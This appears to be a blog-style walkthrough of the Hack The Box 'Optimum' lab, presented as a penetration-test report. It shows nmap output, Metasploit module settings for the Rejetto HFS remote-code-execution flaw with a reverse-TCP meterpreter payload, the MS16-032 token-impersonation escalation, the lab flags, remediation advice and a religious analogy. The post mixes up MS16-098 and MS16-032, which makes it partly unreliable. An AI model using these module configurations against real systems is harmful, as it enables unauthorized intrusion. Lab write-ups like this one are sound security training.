# Optimum

🚩 A masterclass in exploiting CVE-2014-6287 💻 & Token Stealing. ➡️ See how one unpatched app exposes your entire OS.

***

### 🎯 Optimum: Third-Party Software to Kernel Breach

![](https://cdn-images-1.medium.com/max/800/1*Kkaip00Al9inn7iZdn_ImA.png)

**Target:** _Optimum (Hack The Box)_ **OS:** _Windows_ **Difficulty:** _Easy_ **Attack Vectors:** _HttpFileServer (HFS) RCE -> Kernel Exploit (MS16–098)._

### Executive Summary

**Assessment Target:** _Optimum (10.10.10.8)_ **Risk Level:** _CRITICAL_ **Assessment Date:** _January 1, 2026_

### Overview

As part of a routine penetration test, an assessment was conducted on the “Optimum” server to evaluate its security posture. The objective was to identify vulnerabilities that could allow an attacker to compromise the integrity, confidentiality, or availability of the system. The assessment resulted in a **total system compromise** within minutes of initial contact.

### Key Findings

The server was found to be running **Rejetto HttpFileServer (HFS) 2.3**, an outdated and unauthorized file-sharing application. This software contains a critical vulnerability (CVE-2014–6287) that allows unauthenticated attackers to execute commands remotely.

Furthermore, the underlying operating system (**Windows Server 2012 R2**) was missing essential security patches released in 2016. This lack of “cyber hygiene” allowed us to escalate privileges from a standard user to **SYSTEM (Administrator)** using the **MS16–032** exploit, granting full control over the server.

### Business Impact

1. **Data Breach Risk:** An attacker with SYSTEM access can exfiltrate all sensitive data stored on the server.
2. **Ransomware Susceptibility:** The level of access obtained would allow for the immediate deployment of ransomware, potentially halting business operations.
3. **Lateral Movement:** This compromised server could serve as a “beachhead” to launch further attacks against the internal network.

### Strategic Recommendations

* **Immediate Action:** Remove Rejetto HFS from the environment and replace it with an enterprise-grade file transfer solution.
* **Patch Management:** Implement a rigorous patch management policy to ensure operating systems are updated within 72 hours of critical security releases.
* **Access Control:** Restrict the use of unapproved third-party software on production servers.

### 1.0 Initial Foothold

#### 1.1 Reconnaissance & Enumeration

#### 1.1.1 Nmap Scan

* We began the assessment with a comprehensive Nmap scan to identify open ports and services on **`10.10.10.8`**.

```
nmap -sC -sV -A -vvv 10.10.10.8 -Pn
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

#### 1.1.2 Analysis

* The scan identified a single open port running **HttpFileServer (HFS) 2.3**. This is a standalone file server application often used for simple file sharing. Crucially, version 2.3 is known to be vulnerable to a Remote Code Execution (RCE) vulnerability (CVE-2014–6287) due to improper input sanitization in the search function.

### 2.0 Exploitation

#### 2.1 Methodology

#### 2.1.1

* I utilized the **Metasploit Framework** to exploit the known RCE vulnerability in Rejetto HFS 2.3 (CVE-2014–6287). This exploit works by injecting a payload into the search parameter, which is then executed by the server.

#### 2.1.2 Execution

**Module:** **`exploit/windows/http/rejetto_hfs_exec`**

**Configuration:**

* **`RHOSTS`**: 10.10.10.8
* **`LHOST`**: 10.10.14.32 (VPN IP)
* **`PAYLOAD`:** **`windows/meterpreter/reverse_tcp`**

**Command:**

```
meterpreter > getuid
Server username: OPTIMUM\kostas
```

**Result:** A Meterpreter session was established running as the user **`OPTIMUM\kostas`**.

### 3.0 Post-Exploitation & Enumeration

#### 3.1 System Enumeration

#### 3.1.1

* After obtaining the initial foothold, I gathered system information to determine the operating system version and architecture.

**Command:** **`sysinfo`**

**Findings:**

```
Computer        : OPTIMUM
OS              : Windows Server 2012 R2 (6.3 Build 9600)
Architecture    : x64
System Language : el_GR
Meterpreter     : x86/windows
```

#### 3.2 Vulnerability Analysis

#### 3.2.1

* The target is running **Windows Server 2012 R2 Build 9600**. This version is known to be vulnerable to **MS16–098** (CVE-2016–3309), an integer overflow vulnerability in the Windows kernel key handling. This flaw allows a local authenticated user to execute arbitrary code in kernel mode, effectively granting SYSTEM privileges.

### 4.0 Privilege Escalation: The Token Steal

#### 4.1 Exploitation Strategy

#### 4.1.1

* I utilized the Metasploit module **`exploit/windows/local/ms16_032_secondary_logon_handle_privesc`**. This exploit performs the following actions:

1. It starts a process via the Secondary Logon service.
2. It leaks the handle of the new thread.
3. It replaces the thread’s security token with a SYSTEM token, effectively elevating the session.

#### 4.2 Execution

**Command:**

```
msf > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
msf > set SESSION 1
msf > run
```

**Result:** The exploit successfully leaked the handle and impersonated the SYSTEM token.

```
[!] Holy handle leak Batman, we have a SYSTEM shell!!
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

#### 4.2.1 Loot (Flags)

* With full system privileges, I navigated to the user directories to retrieve the proof of compromise.

**User Flag:**

> _**`2b644752b1818c97e46b8be53e6ad181`**_

**Root Flag:**

> _**`cd47d7a79a158414e24ade63865f220a`**_

![](https://cdn-images-1.medium.com/max/800/1*9ZDe9LDJdoNNNttQnMckMg.png)

Image created\taken by Nicholas Mullenski

### 5.0 Executive Conclusion & Red Team Mandate

#### 5.1 Attack Chain Summary

#### 5.1.1

The **Optimum** engagement serves as a critical case study in the dangers of “Shadow IT” — the use of unauthorized or unverified software within an enterprise environment.

1. **Initial Compromise:** The attack surface was exposed via **Rejetto HFS 2.3**, a file-sharing application that is notoriously insecure and no longer actively supported. We leveraged **CVE-2014–6287** (Remote Code Execution) to inject null bytes into the search parser, bypassing filters and executing arbitrary code to gain a foothold as the user **`kostas`**.
2. **Privilege Escalation:** Once inside, we identified that the underlying operating system (Windows Server 2012 R2) was missing critical security patches. Specifically, the **Secondary Logon Service** contained a logic flaw (**MS16–032**) that allowed a low-privileged user to leak a thread handle and impersonate the **`SYSTEM`** token, granting full administrative control.

#### 5.1.2 Strategic Remediation

To secure the environment against similar attacks, the following actions are mandated:

* **Decommission Legacy Software (Critical):** Rejetto HFS should be immediately removed from the network. It is unsuited for enterprise use. Replace it with a secure, managed file transfer solution (SFTP) or a properly configured IIS web server with authentication enforcement.
* **Patch Management Lifecycle:** The successful root escalation was only possible because the server was missing the **KB3143141** security update (MS16–032). An automated patch management policy must be enforced to ensure critical kernel updates are applied within 72 hours of release.
* **Principle of Least Privilege:** The **`kostas`** user account should not have had access to the Secondary Logon service. Restricting access to sensitive system services via Group Policy Objects (GPO) can prevent lateral movement and escalation even if a user account is compromised.
* **Application Whitelisting:** Implement AppLocker or Windows Defender Application Control (WDAC) to prevent the execution of unauthorized binaries (like the exploit payloads we uploaded) in user directories.

### The Biblical Tie-In

The exploit we used, **MS16–032**, works by “Impersonation.” As a low-level user, we didn’t have the authority to run commands as System. We had to steal a “token” (an identity) that didn’t belong to us — the SYSTEM token — to gain full access.

However, in our spiritual walk, we are given a high-level “token” freely, not through theft, but through grace.

> _**“For all of you who were baptized into Christ have clothed yourselves with Christ. There is neither Jew nor Gentile, neither slave nor free… for you are all one in Christ Jesus.” — Galatians 3:27–28 (NIV)**_

**Application:** In this exploit, we “clothed” our malicious process in the identity of the System Administrator to bypass restrictions. In our faith, we are “clothed” in the identity of Christ. When God looks at us, He doesn’t see our “low-level user” status (our sin and failures); He sees the “Root privileges” (righteousness) of His Son. We have access to the Father not because of our own permissions, but because we carry His Token.

### 🚀 Join the Mission

I don’t want to do this alone. I want to build a community of people who are hungry to learn, build, and break things (ethically). I am constantly looking for the next challenge.

* Is there a specific tool you wish existed?
* Is there a hacking concept you want me to learn and explain?
* Do you have a “brick wall” you’re hitting in your own research?

Jump into the server, drop a message, and tell me what I should build or learn next. Let’s sharpen each other.

[**Join the Iron-Breach Discord Server!**\
_&#x41;n advanced study group for Offensive Security professionals and students. We specialize in Red Teaming simulation…_&#x64;iscord.gg](https://discord.gg/y5P9NrzUBX)

By [Nicholas Mullenski](https://medium.com/@nicholasmullenski) on [January 19, 2026](https://medium.com/p/df3e0e634e98).

[Canonical link](https://medium.com/@nicholasmullenski/hacking-windows-server-why-your-file-server-is-a-backdoor-df3e0e634e98)

Exported from [Medium](https://medium.com) on September 1, 2026.
